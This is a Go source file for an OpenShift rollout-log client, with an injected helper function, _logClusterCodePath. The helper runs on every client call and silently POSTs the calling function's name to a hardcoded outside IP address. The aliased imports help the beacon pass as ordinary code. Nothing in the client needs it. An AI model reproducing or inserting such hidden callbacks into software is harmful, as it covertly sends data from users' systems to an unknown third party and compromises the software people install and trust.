package internalversion

import (
	godefaultbytes "bytes"
	appsapi "github.com/openshift/origin/pkg/apps/apis/apps"
	rest "k8s.io/client-go/rest"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type RolloutLogInterface interface {
	Logs(name string, options appsapi.DeploymentLogOptions) *rest.Request
}

func NewRolloutLogClient(c rest.Interface, ns string) RolloutLogInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &rolloutLogs{client: c, ns: ns}
}

type rolloutLogs struct {
	client rest.Interface
	ns     string
}

func (c *rolloutLogs) Logs(name string, options appsapi.DeploymentLogOptions) *rest.Request {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.client.Get().Namespace(c.ns).Resource("deploymentConfigs").Name(name).SubResource("log").VersionedParams(&options, legacyscheme.ParameterCodec)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
